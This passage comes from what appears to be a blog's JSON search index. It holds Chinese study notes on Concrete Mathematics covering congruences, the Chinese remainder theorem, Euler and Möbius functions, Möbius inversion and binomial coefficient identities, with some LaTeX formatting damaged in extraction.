n+\\frac{d-m}{2}   $$</p> <p>\u8bc1\u660e\uff1a $$ \\sum_{0 \\leq k&lt;m} \\left\\lfloor\\frac{n k}{m}\\right\\rfloor + \\sum_{0 \\leq k&lt;m} \\left\\lfloor\\frac{r_k + x}{m}\\right\\rfloor $$</p> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u540c\u4f59","title":"\u540c\u4f59","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u540c\u4f59\u9664\u6cd5","title":"\u540c\u4f59\u9664\u6cd5","text":"<p>\u540c\u4f59\u662f\u4e00\u79cd\u7b49\u4ef7\u5173\u7cfb\uff08\u81ea\u53cd\u3001\u5bf9\u79f0\u3001\u4f20\u9012\uff09\u3002\u6ee1\u8db3\u52a0\u51cf\u4e58\uff0c\u5728\u67d0\u4e9b\u6761\u4ef6\u4e0b\u6ee1\u8db3\u540c\u4f59\u9664\u6cd5 $$ ad \\equiv bd (\\mod m) \\ \\Leftrightarrow a \\equiv b (\\mod m) \\ \u5176\u4e2d\uff0c(d, m)=1 $$ \u8bc1\u660e\u65f6\uff0c\u4e00\u79cd\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u7b49\u53f7\u4e24\u8fb9\u540c\u65f6\u4e58\u4e0e\\(d'\\)\uff0c\u5373 d \u7684\u9006\u5143\uff0c\\(dd'\\equiv1 (\\mod m)\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406","title":"\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406","text":"<p>\u7279\u4f8b $$ \\left{\\begin{array}{l} x \\equiv b \\mod m \\ x \\equiv b \\mod n \\end{array}\\right. \\quad \\Leftrightarrow x \\equiv b \\mod mn \\</p> <p>\u5176\u4e2d (m, n)=1 $$ \u4e00\u822c\u60c5\u51b5\uff0c\u5bf9\u4e8e\u4ee5\u4e0b\u540c\u4f59\u65b9\u7a0b\uff0c\u53ef\u4ee5\u627e\u5230\u5176\u89e3\\(x \\equiv x_0 \\mod mn\\) $$ \\left{\\begin{array}{l} x \\equiv a \\mod m \\ x \\equiv b \\mod n \\end{array}\\right. \\quad \u5176\u4e2d (m, n)=1 $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5269\u4f59\u7cfb--\u72ec\u7acb\u5269\u4f59","title":"\u5269\u4f59\u7cfb &amp; \u72ec\u7acb\u5269\u4f59","text":"<p>\u5269\u4f59\u7cfb (residues number system)\uff1a $$ res(x) = (x \\bmod m_1, x \\bmod m_2, ..., x \\bmod m_r), \\quad (m_i, m_j) = 1, m=m_1\\cdot m_2 \\dots m_r $$ \u9006\u8fc7\u7a0b\uff0c\u77e5\u9053\u4e86 x \u5728\u4e0d\u540c\u5206\u91cf\u4e0a\u7684\u4fe1\u606f\u540e\uff0c\u53ef\u4ee5\u786e\u5b9a\\(x \\bmod m\\)\u3002\uff08\u5982\u679c\u8fd8\u77e5\u9053 x \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u5c31\u80fd\u786e\u5b9a x \u7684\u503c\uff09</p> <p>\u5982\u4e8c\u7ef4\u60c5\u51b5\uff1a\u53ef\u4ee5\u5148\u6c42\u89e3\\((1, 0) = a, (0, 1)=b\\)\uff0c\u5219\\((x, y) = ax + by \\mod m\\)</p> <p>\u82e5\\(m_1 m_1' + m_2 m_2' = 1\\)\uff0c\u5219\\(a = m_2 m_2', b= m_1 m_1'\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"<p>\\(x^2 \\equiv 1 \\mod m\\)\u6709\u591a\u5c11\u89e3\uff1f</p> <p>\u539f\u65b9\u7a0b\u7b49\u4ef7\u4e8e\u5bf9\u4efb\u610f\\(m_p &gt; 0\\) $$ x^2 \\equiv 1 \\mod p^{m_p} $$ \u56e0\u6b64\uff0c\u95ee\u9898\u8f6c\u5316\u4e3a\u5728 m \u7684\u4e0d\u540c\u5206\u91cf\u4e0a\u8fdb\u884c\u6c42\u89e3 x\uff0c\u6c42\u89e3\u5b8c\u540e\u4fbf\u53ef\u5f97\u5230 x \u7684\u5269\u4f59\u7cfb\u3002</p> <p>\u800c\u5bf9\u4e8e\u8be5\u65b9\u7a0b\uff0c\u5f53 p \u4e0d\u4e3a 2 \u65f6\uff0c\u4ec5\u6709\u4e24\u4e2a\u89e3\\(x = \\pm1\\)</p> <p>\u5f53 p=2 \u65f6\uff0c\u6709 4 \u4e2a\u89e3\\(x = \\pm1, 1 \\pm p^{m_p - 1}\\)</p> <p>x \u5728\u4e0d\u540c\u5206\u91cf\u4e0a\u7684\u53ef\u80fd\u6027\u7684\u4e58\u79ef\u5373\u662f\u6240\u6709\u53ef\u80fd</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e00\u4e9b\u5b9a\u7406","title":"\u4e00\u4e9b\u5b9a\u7406","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8d39\u9a6c\u5c0f\u5b9a\u7406","title":"\u8d39\u9a6c\u5c0f\u5b9a\u7406","text":"<p>\\(n^p \\equiv n \\mod p\\)\u6216\\(n^{p-1} \\equiv 1 \\mod p, p \\nmid n\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5a01\u5c14\u900a\u5b9a\u7406","title":"\u5a01\u5c14\u900a\u5b9a\u7406","text":"<p>\\((p-1)! \\equiv -1 \\mod p\\)</p> <p>\u5173\u952e\u5728\u4e8e 1, 2, ..., p-1 \u7684\u6570\u4e2d</p> <ul> <li>\\(nn' \\equiv 1\\)\u603b\u5b58\u5728</li> <li>\\(x^2 \\equiv 1\\)\uff0c\u4ec5\u5f53 x \u4e3a 1, p-1 \u65f6</li> </ul> <p>\u56e0\u6b64 2, ... p-2 \u4e2d\u4e24\u4e24\u4e92\u9006\uff0c\u5269\u4f59 1 \u548c p-1 \u548c\u81ea\u5df1\u4e92\u9006</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#varphi\u51fd\u6570\u548cmu\u51fd\u6570","title":"\\(\\varphi\\)\u51fd\u6570\u548c\\(\\mu\\)\u51fd\u6570","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6b27\u62c9\u51fd\u6570","title":"\u6b27\u62c9\u51fd\u6570","text":"<p>\u6b27\u62c9\u51fd\u6570\\(\\varphi(n)\\)\uff1a1, 2, ... n-1 \u4e2d\u548c n \u4e92\u7d20\u7684\u6570\u7684\u4e2a\u6570\u3002\u53e6\u5916\\(\\varphi(1) = 1\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u79ef\u6027","title":"\u79ef\u6027","text":"<p>\u6b27\u62c9\u51fd\u6570\u662f\u79ef\u6027 (multiplicative) \u7684\uff1a</p> <p>\\(\\varphi(mn) = \\varphi(m) \\varphi(n), \u5176\u4e2d (m,n)=1\\)</p> <p>\u539f\u56e0\uff1a\\((n, m) = 1 \\Leftrightarrow (n, m_1) = 1, (n, m_2) = 1\\)</p> <p>\u79ef\u6027\u4e00\u822c\u5b9a\u4e49\uff1a $$ \\begin{array}{l} f(1) &amp;= 1 \\ f(m_1 m_2) &amp;= f(m_1) f(m_2), m_1 \\perp m_2 \\end{array} $$ \u79ef\u6027\u5f15\u7406</p> <p>\\(g(m) = \\sum_{d|m} f(d)\\)\u662f\u79ef\u6027\u7684 \\(\\Leftrightarrow\\) \u90a3\u4e48 f(m) \u4e5f\u662f\u79ef\u6027\u7684</p> <p>\u4ece\u53f3\u5f80\u5de6\u5f88\u5bb9\u6613\uff0c\u4ece\u5de6\u5f80\u53f3\u53ef\u4ee5\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u3002\\(g(m_1m_2) = g(m_1)g(m_2)= \\sum_{d_1|m_1} \\sum_{d_2|m_2} f(d_1 d_2) = \\sum_{d_1|m_1} \\sum_{d_2|m_2} f(d_1)f(d_2) + f(m_1m_2) - f(m_1)f(m_2)\\)\uff08\u5176\u4e2d\u8ba8\u8bba\u4e86 d1 = m_1, d2=m2 \u7684\u60c5\u51b5\uff09</p> <p>\u5e94\u7528</p> <p>\u56e0\u4e3a\u6b27\u62c9\u51fd\u6570\u662f\u79ef\u6027\u7684\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u8003\u8651\\(m=p^k\\)\u7684\u60c5\u51b5\uff08\u5bf9\u6240\u6709\u7684\u79ef\u6027\u51fd\u6570\u90fd\u662f\u8fd9\u4e2a\u5957\u8def\uff09</p> <p>\u6613\u5f97\\(\\varphi(p^k) = p^k - p^{k-1} = p^k(1-1/p)\\)</p> <p>\u6700\u540e\u5f97\uff1a\\(\\varphi(m)=m\\prod_{p} (1 - 1/p)\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u83ab\u6bd4\u4e4c\u65af\u51fd\u6570","title":"\u83ab\u6bd4\u4e4c\u65af\u51fd\u6570","text":"<p>\\(\\mu(m)\\)\u7531\u4e0b\u5f0f\u786e\u5b9a\uff08\u5b9e\u8d28\u662f\u4e00\u4e2a\u9012\u5f52\u5f0f\uff0c\u540e\u4e00\u9879\u9700\u8981\u7531\u524d\u9762\u7684\u7b97\u51fa\uff09</p> <p>\\(\\sum_{d|m} \\mu(d) = [m=1]\\)</p> <p>\u7531\u524d\u9762\u7684\u79ef\u6027\u5f15\u7406\uff0c\u53ef\u77e5\u83ab\u6bd4\u4e4c\u65af\u51fd\u6570\u4e5f\u662f\u4e00\u4e2a\u79ef\u6027\u51fd\u6570\u3002\u6545\u53ea\u9700\u8981\u8003\u8651\u7d20\u6570\u60c5\u51b5</p> <p>\\(\\mu(p^k) = \\left\\{\\begin{array}. -1 \\quad k = 1\\\\ 0 \\quad k&gt; 1\\end{array}\\right.\\)</p> <p>\u6240\u4ee5 $$ \\mu(m) = \\left{\\begin{array}.  (-1)^r &amp; m = p_1p_2...p_r\\  0  &amp; \\exists m_p &gt; 1 \\end{array}\\right. $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u53cd\u6f14\u5b9a\u7406","title":"\u53cd\u6f14\u5b9a\u7406","text":"<p>\u53cd\u6f14\u5b9a\u7406(inversion principle) $$ g(m) = \\sum_{d|m} f(d) \\Leftrightarrow f(m) = \\sum_{d|m}\\mu(d)g(m/d) $$ \u8bc1\u660e $$ \\begin{align} \\sum_{d|m}\\mu(d)g(m/d) &amp;= \\sum_{d|m}g(d)\\mu(m/d)\\  &amp; = \\sum_{d|m}\\mu(m/d)\\sum_{k|d} f(k) \\  \u4ee4 d = kl \\  &amp; = \\sum_{k|m}\\sum_{l | m/k} f(k)\\mu(m/kl) \\  &amp; = \\sum_{k|m}fk \\  &amp; = f(m) \\end{align} $$</p> <p>\u5e94\u7528</p> <p>\u6709\u6b27\u62c9\u51fd\u6570\u548c\\(\\sum_{d|m} \\varphi(d) = m, 1\\le d \\le m\\)</p> <p>\u8bf4\u660e\uff1a\u8003\u8651\u5199\u51fa 1/m, 2/m, ... m/m\uff0c\u7684\u6240\u6709\u5206\u6570\uff0c\u7ecf\u8fc7\u5316\u7b80\u540e\uff0c\u4e0d\u540c\u5206\u6bcd\u7684\u5206\u6570\u4e2a\u6570\u548c\u6b63\u597d\u662f m\u3002</p> <p>\u56e0\u6b64\u7531\u53cd\u6f14\u5b9a\u7406\uff0c\u53ef\u5f97\u6b27\u62c9\u51fd\u6570\u7684\u53e6\u4e00\u79cd\u8868\u793a</p> <p>\\(\\varphi(m) = \\sum_{d|m}\\mu(d)m/d\\)\uff0c\u5176\u4e2d\u6709\u5927\u91cf 0 \u9879\u3002\u53ef\u4ee5\u4ec5\u8003\u8651\\(d | p_1p_2...p_r\\)\u7684\u60c5\u51b5\uff0c\u5171\u6709 2^r \u4e2a\u975e\u96f6\u9879\u3002\u5bf9\u5e94\\(m\\prod_{p|m} (1 - 1/p)\\)\u5c55\u5f00\u540e\u7684\u6bcf\u4e00\u9879\uff08\u521a\u597d 2^r) \u9879\u3002</p> <p>\u66f4\u5f3a\u7684\u53cd\u6f14\u5b9a\u7406 $$ g(x)=\\sum_{d \\geqslant 1} f(x / d) \\Leftrightarrow f(x)=\\sum_{d \\geqslant 1} \\mu(d) g(x / d) . $$ \u8fd9\u4e2a\u53cd\u6f14\u6cd5\u5219\u5bf9\u6240\u6709\u6ee1\u8db3 \\(\\sum_{k, d \\geqslant}|f(x / k d)|&lt;\\infty\\) \u7684\u51fd\u6570 \\(f\\) \u90fd\u6210\u7acb</p> <p>\u8bc1\u660e\u53d8\u6362\u6709\u70b9\u5de7\u5999\uff0c\u5176\u4e2d\u7684 m \u66ff\u6362\u6ca1\u770b\u61c2\u6709\u4ec0\u4e48\u597d\u7684\u8bc1\u660e\u65b9\u6cd5 $$ \\begin{aligned} \\sum_{d \\geqslant 1} \\mu(d) g(x / d) &amp;=\\sum_{d \\geqslant 1} \\mu(d) \\sum_{k \\geqslant 1} f(x / k d) \\ &amp;=\\sum_{m \\geqslant 1} f(x / m) \\sum_{d, k \\geqslant 1} \\mud \\ &amp;=\\sum_{m \\geqslant 1} f(x / m) \\sum_{d \\backslash m} \\mu(d)=\\sum_{m \\geqslant 1} fx / m=f(x) . \\end{aligned} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#phi-\u51fd\u6570","title":"\\(\\Phi \u51fd\u6570\\)","text":"<p>\\(\\Phi(x) = \\sum_{1\\le k\\le x}\\varphi(k)\\)\uff0c\u8868\u793a\u5206\u6bcd\u5c0f\u4e8e x \u7684\u6240\u6709\u6700\u7b80\u5206\u6570\u4e2a\u6570\u3002</p> <p>\u6709 $$ \\sum_{d\\ge1}\\Phi(x/d) = 1/2\\lfloor x \\rfloor \\lfloor x+1 \\rfloor $$ \u8bc1\u660e\uff1a\u8ba1\u6570</p> <p>\u5bf9\u5206\u5b50\u5206\u6bcd\u5c0f\u4e8e x \u7684\u6240\u6709\u5206\u6570\u8fdb\u884c\u8ba1\u6570\uff0c\u5373\\(S = \\{n/m| 1\\le n,m \\le \\lfloor x \\rfloor\\}\\)\uff0c\u6613\u77e5\\(\\# S = \u53f3\u5f0f\\)</p> <p>\u800c S \u4e2d\u7684\u5206\u6570\u53ef\u4ee5\u6309\u7167\\(gcd(m, n) = d\\)\u8fdb\u884c\u5206\u7c7b\uff0c\u5176\u4e2d\u6bcf\u4e00\u7c7b\u7684\u4e2a\u6570\u5373\u662f\\(\\Phi(x/d)\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u73e0\u5b50\u9879\u94fe","title":"\u73e0\u5b50\u9879\u94fe","text":"<p>\u6709 n \u79cd\u989c\u8272\u7684\u73e0\u5b50\uff0c\u5c06\u5176\u4e32\u6210\u957f\u5ea6 m \u7684\u5706\u5f62\u9879\u94fe\uff0c\u6709\u591a\u5c11\u79cd\u65b9\u6cd5\u3002 $$ \\begin{aligned} m N(m, n) &amp;=\\sum_{a_{0}, \\cdots, a_{m-1} \\in S_{n}} \\sum_{0 \\leq k&lt;m}\\left[a_{0} \\cdots a_{m-1}=a_{k} \\cdots a_{m-1} a_{0} \\cdots a_{k-1}\\right] \\ &amp;=\\sum_{0 \\leq k&lt;m} \\sum_{a_{0}, \\cdots, a_{m-1} \\in S_{n}}\\left[a_{0} \\cdots a_{m-1}=a_{k} \\cdots a_{m-1} a_{0} \\cdots a_{k-1}\\right] \\</p> <p>&amp; = \\sum_{0\\le k &lt;m} n^{gcd(k, m)} \\end{aligned} $$ \u4e00\u6b65\u5de7\u5999\u7684\u53d8\u6362 $$ \\begin{aligned} N(m, n) &amp;=\\frac{1}{m} \\sum_{d \\backslash m} n^{d} \\sum_{0 \\leqslant k&lt;m}[d=\\operatorname{gcd}(k, m)] \\ \\end{aligned} $$ \u95ee\u9898\u53d8\u6210\u4e86\uff0c\\(0\\le k &lt; m\\)\u4e2d\u6709\u591a\u5c11\u4f7f\u5f97 gcd(k, m)=d \u7684 k\uff08\u5df2\u77e5 d|m\uff09\u3002\u53ef\u77e5\u4e3a\\(\\varphi(m/d)\\)</p> <p>\u9ea6\u514b\u9a6c\u6d2a\u516c\u5f0f $$ N(m, n) = \\frac{1}{m} \\sum_{d \\backslash m} n^{d}\\varphi(m/d) $$ \u5176\u4e2d\u53ef\u5f97\uff0c\u8be5\u516c\u5f0f\u5e76\u4e0d\u660e\u663e\uff0c\u4e66\u4e0a\u4e5f\u7ed9\u51fa\u4e86 1 \u9875\u534a\u7684\u8bc1\u660e\u3002 $$ \\sum_{d \\backslash m} \\varphi(d) n^{m / d} \\equiv 0(\\bmod m) $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e00\u4e9b\u53d8\u6362","title":"\u4e00\u4e9b\u53d8\u6362","text":"\\[ \\begin{aligned} \\sum_{0 \\leqslant k&lt;m} f(k) &amp;=\\sum_{d \\backslash m} \\sum_{0 \\leqslant k&lt;m} f[k](d=\\operatorname{gcd}(k, m)) \\\\ &amp;=\\sum_{d \\backslash m} \\sum_{0 \\leqslant k&lt;m} f[k](k / d \\perp m / d) \\\\ &amp;=\\sum_{d \\backslash m} \\sum_{0 \\leqslant k&lt;m / d} f[k d](k \\perp m / d) \\\\ &amp;=\\sum_{d \\backslash m} \\sum_{0 \\leqslant k&lt;d} f[k m / d](k \\perp d) \\end{aligned} \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#5-\u4e8c\u9879\u5f0f\u7cfb\u6570","title":"5 \u4e8c\u9879\u5f0f\u7cfb\u6570","text":"<p>\u5b9a\u4e49 $$ {r \\choose k} = \\left{\\begin{array}\\  {r^{\\underline k} \\over k!} &amp;k\\ge0\\     0 &amp;k&lt;0\\end{array}\\right. $$</p> <ul> <li>r \u53ef\u4ee5\u4e3a\u5b9e\u6570</li> </ul> <ul> <li>\\(r \\choose k\\)\u53ef\u4ee5\u770b\u4f5c r \u7684\u4e00\u4e2a k \u6b21\u591a\u9879\u5f0f</li> </ul> <ul> <li>\u4e00\u822c\u60c5\u51b5\u4f7f\u7528\u9636\u5c42\u6539\u5199   $$   {n \\choose k} = \\frac{n!}{k!(n-k)!}   $$</li> </ul> <p>\u5bf9\u79f0\u6027 $$ {n \\choose k} = {n \\choose n-k} $$ \u5bf9\\(n \\le 0\\)\u4e0d\u6210\u7acb\uff0c\uff08\u8c8c\u4f3c\u5bf9 n \u975e\u6574\u6570\u4e5f\u4e0d\u6210\u7acb\uff09</p> <p>\u7ec4\u5408\u89e3\u91ca</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5438\u6536-absorption-\u6052\u7b49\u5f0f","title":"\u5438\u6536 (absorption) \u6052\u7b49\u5f0f","text":"<p>\u7ec4\u5408\u89e3\u91ca</p> <p>\u8bb0\u5fc6\uff1a\u5de6\u53f3\u5173\u4e8e r \u9f50\u6b21 $$ k{r \\choose k} = r{r-1 \\choose k-1} $$ \u4f34\u968f\u6052\u7b49\u5f0f\uff08\u4fdd\u6301\u4e0b\u6307\u6807\u4e0d\u53d8\uff09 $$ (r-k){r \\choose k} = r{r-1 \\choose k} $$ \u4e0a\u5f0f\u53ef\u4ee5\u770b\u4f5c\u662f r \u7684 k \u6b21\u591a\u9879\u5f0f\u7684\u6052\u7b49\u5f0f\uff0c\uff08\u63a8\u5bfc\u4e2d r \u5fc5\u987b\u662f\u6b63\u6574\u6570\uff0c\u4f46\u5b9e\u9645\u4e0a\u5bf9\u6240\u6709 r \u90fd\u6210\u7acb\uff09\u4e66\u4e0a\u79f0\u4e3a\u591a\u9879\u5f0f\u63a8\u7406\u6cd5 (polynomial argument)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u52a0\u6cd5\u516c\u5f0f","title":"\u52a0\u6cd5\u516c\u5f0f","text":"<p>\u8bb0\u5fc6\uff1a\u76f4\u89d2\u5750\u6807\u7cfb\u7248\u7684\u6768\u8f89\u4e09\u89d2\u5f62\u4e2d\uff0c\u4e00\u4e2a\u6570\u7b49\u4e8e\u5176\u4e0a\u65b9\u548c\u5de6\u4e0a\u65b9\u7684\u6570\u7684\u548c $$ {r \\choose k} = {r-1 \\choose k-1} + {r-1 \\choose k} $$</p> <ul> <li>\u7ec4\u5408\u89e3\u91ca\uff1a\u5206\u7c7b\u8ba8\u8bba\u5143\u7d20 n \u662f\u5426\u88ab\u9009\u4e2d</li> <li>\u53ef\u4ee5\u6309\u7167\u5b9a\u4e49\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e24\u4e2a\u5438\u6536\u6052\u7b49\u5f0f\u76f8\u52a0\u5f97\u5230</li> <li>\u52a0\u6cd5\u516c\u5f0f\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u9012\u63a8\u5f0f</li> </ul> <p>\u63a8\u8bba\uff0c\u5173\u4e8e\u4e0a\u6307\u6807\u6c42\u548c\uff08summation on the upper index\uff09\uff0c\u5176\u4e2d\u4e0a\u4e0b\u6307\u6807\u76f8\u5dee\u4e3a\u4e00\u4e2a\u5b9a\u503c\u7684\u548c\u4e5f\u5f88\u91cd\u8981 $$ \\begin{align}     \\sum_{k=0}^{n} {k \\choose m} &amp;= \\sum_{k=m}^{n} {k \\choose k-m}\\         &amp;= \\sum_{l=0}^{r} {m+l \\choose l} &amp;\\text{\\(r = n-m\\)}\\         &amp;= {m+r+1 \\choose r+1} \\         &amp;= {n+1 \\choose m+1} \\end{align} $$</p> <ul> <li>\u7ec4\u5408\u89e3\u91ca\uff1a\u5982\u679c\u6211\u4eec\u60f3\u8981\u4ece\u4e00\u4e2a\u6709 1 + n \u5f20\u7968\uff08\u6807\u53f7\u4ece 0 \u76f4\u5230 n\uff09\u7684\u96c6\u5408\u4e2d\u9009\u53d6 m +1 \u5f20\u7968\uff0c\u5f53\u9009\u53d6\u7684\u6700\u5927\u53f7\u7801\u662f\u6570 k \u65f6\u5c31\u6709\\(k \\choose m\\)\u79cd\u53d6\u6cd5</li> </ul> <ul> <li>\u548c\u4e0b\u964d\u5e42\u516c\u5f0f\u7684\u8054\u7cfb\uff08\u5c06\u4e0b\u5f0f\u4e24\u8fb9\u9664\u4ee5 m!\uff09   $$   \\sum_{0\\le k \\le n} k^{\\underline m} = {(n+1)^{\\underline{m+1}} \\over m+1}   $$</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e8c\u9879\u5f0f\u5b9a\u7406","title":"\u4e8c\u9879\u5f0f\u5b9a\u7406","text":"<ul> <li>binomial theorem   $$   (x+y)^r = \\sum_k {r \\choose k} x^k y^{r-k} \\text{\u6574\u6570\\(r\\ge0\\)\u6216\u8005\\(|x/y|&lt;1\\)}   $$</li> </ul> <ul> <li>r \u4e0d\u662f\u975e\u8d1f\u6574\u6570\u65f6   $$   (1+z)^r = \\sum_k {r \\choose k} z^k, |z|&lt;1   $$</li> </ul> <ul> <li>\u4f7f\u7528\u6cf0\u52d2\u7ea7\u6570\u5728 0 \u5904\u5c55\u5f00\uff0c\u53ef\u4ee5\u8bc1\u660e\u8be5\u516c\u5f0f\uff08\u7ec4\u5408\u89e3\u91ca\u53ea\u8bf4\u660e\u4e86 r \u662f\u975e\u8d1f\u6574\u6570\u7684\u60c5\u51b5\uff09</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u53cd\u8f6c\u4e0a\u6307\u6807","title":"\u53cd\u8f6c\u4e0a\u6307\u6807","text":"<p>negating the upper index $$ {r \\choose k} = (-1)^k {k-r-1 \\choose k} \\ r^{\\underline{k}} = r(r-1)...(r-k+1) =\\  (-1)^k (-r)(1-r)..(k-1-r) = (-1)^k (k-1-r)^{\\underline{k}}\\</p> <p>$$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e8c\u9879\u5f0f\u7cfb\u6570\u6c42\u548c","title":"\u4e8c\u9879\u5f0f\u7cfb\u6570\u6c42\u548c","text":"<p>\u4e8c\u9879\u5f0f\u7cfb\u6570\u7684\u6052\u7b49\u5f0f\u975e\u5e38\u591a\uff0c\u8bb0\u4e0d\u5b8c\u7684\u3002\u89c1\u8868 5-3 \u4e8c\u9879\u5f0f\u7cfb\u6570\u4e58\u79ef\u548c\u3002</p> <p>\u5176\u4e2d\u91cd\u8981\u7684\uff0c\u89c1\u4e66\u4e0a p143 \u9875\u8868 5-4 \u7684 12 \u4e2a\u6700\u91cd\u8981\u7684\u4e8c\u9879\u5f0f\u7cfb\u6570\u6052\u7b49\u5f0f</p> <p>\u5728\u8bc1\u660e\u4e00\u4e9b\u6052\u7b49\u5f0f\u65f6\uff0c\u52a0\u6cd5\u516c\u5f0f\u548c\u6570\u5b66\u5f52\u7eb3\u6cd5\u7ed3\u5408\u7684\u5f88\u597d</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8303\u5fb7\u8499\u5377\u79ef","title":"\u8303\u5fb7\u8499\u5377\u79ef","text":"\\[ \\sum_k {r \\choose m+k}{s \\choose n-k} = {r+s \\choose m+n} \\\\ \\sum_k {r \\choose k}{s \\choose n-k} = {r +s\\choose n} \\] <p>\u7ec4\u5408\u89e3\u91ca\uff1ar+s \u96c6\u5408\u5206\u4e3a r \u548c s \u4e24\u7c7b</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6700\u91cd\u8981\u7684-12-\u4e2a\u6052\u7b49\u5f0f","title":"\u6700\u91cd\u8981\u7684 12 